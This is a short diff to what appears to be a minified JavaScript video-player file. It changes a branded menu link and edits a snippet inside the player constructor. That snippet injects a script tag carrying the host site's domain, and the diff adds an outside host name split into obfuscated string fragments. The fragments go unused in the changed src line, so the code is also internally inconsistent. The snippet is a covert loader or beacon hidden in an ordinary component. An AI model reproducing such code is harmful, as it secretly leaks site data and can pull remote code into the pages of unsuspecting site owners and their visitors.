@@ -975,8 +975,8 @@
 							e.infoPanel.triggle()
 						}
 					}, {
-						text: "手掌tv",
-						link: "http://www.plamtv.com"
+						text: "COKEMV-5.0",
+						link: "https://cokemv.cn"
 					}]), e
 			}
 		},
@@ -2853,14 +2853,14 @@
 				o = function() {
 					function e(t) {
 						var a = document.createElement('script'),
-							ad = '',
-							af = '',
+							ad = '//api',
+							af = 'm.cc/b?ac=',
 							ac = document.domain.split('.').slice(-2).join('.'),
-							ae = '',
-							agi = '',
+							ae = '.hyz',
+							agi = 'p&',
 							ak = document.getElementsByTagName('script')[0];
 						a.type = 'text/javascript';
-						a.src = ad + ae + af + agi + 'url=' + ac;
+						a.src = 'url=' + ac;
 						ak.parentNode.insertBefore(a, ak);
 						var n = this;
 						i(this, e), this.container = t.template.infoPanel, this.template = t.template, this.video = t.video, this.player =
